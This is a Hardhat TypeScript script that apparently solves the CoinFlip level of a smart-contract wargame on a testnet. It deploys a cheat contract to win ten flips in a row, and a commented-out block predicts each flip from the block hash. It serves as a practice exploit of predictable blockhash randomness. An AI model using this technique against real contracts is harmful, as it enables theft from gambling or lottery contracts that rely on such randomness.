// import { ethers as ethers_hh } from "hardhat";
import { ethers } from "ethers";
import { getSigner } from "./signer";

import { CoinFlipCheat__factory } from "../typechain/";
import { CoinFlip__factory } from "../typechain/ethers-v5";
import { BigNumber } from "ethers";
import { createLevel, submitLevel } from "./utils";

async function main() {
  const signer = getSigner();
  const level = await createLevel(signer, "flip");
  const coinFlip = CoinFlip__factory.connect(level, signer);
  const coinFlipCheat = await new CoinFlipCheat__factory(signer).deploy(level);
  await coinFlipCheat.deployed();
  // for 10 loop wait 10 block
  for (let i = 0; i < 10; i++) {
    console.log("loop", i);
    const tx = await coinFlipCheat.cheat({ gasLimit: 1000000 });
    await tx.wait();
    console.log("wins", await coinFlip.consecutiveWins());
  }
  //submit level
  const tx = await submitLevel(signer,level);
}


// npx hardhat run scripts/3_flip.ts  --network rinkeby

// The API from alchemy actually slow enough that you can miss the block.
// So only 2 await in code to prevent missed.
// And calling while loop might take a while.
// The original code is using real contract to predict the result. But it's too slow.
// Replicate with raw math instead.

// async function main() {
//   const level = "0x460B9a3769FB14ebcd9A5D1Dd093b850cfab2685";

//   const veryExpensiveGasPrice = ethers.utils.parseUnits("20", "gwei");
//   const signer = getSigner();
//   const contract = CoinFlip__factory.connect(level, signer);

//   let winCount: Number = 0;
//   while (winCount < 10) {
//     if (winCount == 10) break;
//     const currentBlock = await signer.provider?.getBlock("latest");
//     const predictResult = await PredictFlip(currentBlock?.hash ?? "0x");
    
//     console.log("predictResult", predictResult);
//     console.log("send tx");
//     const tx = await contract.flip(predictResult, {
//       gasLimit: 1000000,
//       gasPrice: veryExpensiveGasPrice,
//     });
//     const receipt = await tx.wait();

//     console.log("block latest number:", receipt.blockNumber);
//     contract.consecutiveWins().then((res) => {
//       winCount = res.toNumber();
//       console.log("winCount", winCount);
//     });
//   }
// }
// async function PredictFlip(hash: string) {
//   const FACTOR = BigNumber.from(
//     "57896044618658097711785492504343953926634992332820282019728792003956564819968"
//   );
//   const hashValue = BigNumber.from(hash);
//   const actual_flip = hashValue.div(FACTOR).eq(1);
//   return actual_flip;
// }

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });
